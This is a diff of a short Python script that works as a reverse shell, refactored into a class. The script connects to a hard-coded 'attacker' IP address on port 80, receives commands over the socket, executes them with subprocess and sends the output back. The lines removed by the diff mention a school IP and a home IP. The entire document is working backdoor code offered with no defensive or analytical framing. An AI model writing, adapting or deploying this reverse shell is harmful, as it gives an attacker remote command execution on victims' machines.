@@ -1,30 +1,27 @@
 # Modules
-import sys
-import socket
-import subprocess
-import os
+import sys,socket,subprocess,os
 
-# SCHOOL IP: 192.168.210.158
-# HOME IP: 192.168.0.228
-
-#varviables
-IP = "192.168.0.228"
+# Variables
+IP = "192.168.0.90"
 PORT = 80
-BUFFER_SIZE = 1024
+BUFFER = 1024
 
-# Connect to the attacker
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((IP, PORT))
+class Runner():
+  def __init__(self):
+    # Connect to the attacker
+    self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    self.s.connect((IP, PORT))
 
-#Getting command, and sending it to the attacker
+  # Run commands
+  def run_command(self):
+    command = self.s.recv(BUFFER).decode()
+    output = subprocess.getoutput(command)
+    self.s.send(output.encode())
+
+# Looping
+conn = Runner()
 while True:
-  command = s.recv(BUFFER_SIZE).decode()
-  output = subprocess.getoutput(command)
-  if command.lower() == "exit":
-    print("[!] Exited...")
+  try:
+    conn.run_command()
+  except ConnectionError:
     sys.exit()
-  elif (output == "") or (output == "\n"):
-    s.send("Nothing to output...".encode())
-  else:
-    s.send(output.encode())
-
